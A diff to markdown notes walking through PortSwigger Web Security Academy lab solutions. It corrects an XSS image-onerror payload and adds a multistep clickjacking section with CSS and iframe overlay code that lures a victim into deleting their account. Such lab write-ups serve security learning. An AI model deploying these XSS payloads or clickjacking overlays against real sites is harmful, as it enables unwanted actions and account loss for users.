@@ -143,7 +143,7 @@ p {
 
 - Click on **“Submit feedback”** and fill the form.
 - In the **name** field, pass the XSS payload:  
-  `<img src=x onerrro=alert(1)>`
+  `<img src=x onerror=alert(1)>`
 - Intercept the request in **Burp Suite** and check the response to confirm whether the payload is reflected (DOM-based XSS behavior).
 - Copy the reflected parameter values and construct the feedback URL so the form fields are auto-filled, for example:  
   `https://0ac6009203ecf7a384c0e1c300fd00c4.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&email=yesy%40gmail.com&subject=sdfsdfsdf&message=sdfsfsdf#feedbackForm`
@@ -177,7 +177,38 @@ p {
 <p>Click Me</p>
 <iframe src="https://0ac6009203ecf7a384c0e1c300fd00c4.web-security-academy.net/feedback?name=%3Cimg+src%3Dx+onerror%3Dprint%28%29%3E&email=yesy%40gmail.com&subject=sdfsdfsdf&message=sdfsfsdf#feedbackForm">
 
-## Lab - 5  Exploiting clickjacking vulnerability to trigger DOM-based XSS**
+## Lab - 5  Multistep clickjacking
+ Click on **“Go to exploit server”**.
+- On the exploit server page, **generate the exploit code**.
+- **Format the exploit code** as instructed in the lab (use the required HTML/iframe structure and styling).
+- this time we have to two add different class to delete the account 
+- Once the exploit page is ready, click on **“Deliver to victim”** to send the exploit.
+
+<style>
+iframe {
+        position:relative;
+        width:1135;
+        height:600;
+        opacity:0.5;
+        z-index: 2;
+    }
+.first {
+        position:absolute;
+        top:499;
+        left:67;
+        z-index: 1;
+}
+.second {
+        position:absolute;
+        top:295;
+        left:200;
+        z-index: 1;
+}
+</style>
+<p class="first">Click me first</p>
+<p class="second">Click me next</p>
+
+<iframe src="https://0ab20022043781428066030200f3003a.web-security-academy.net/my-account"></iframe>
 
 
 
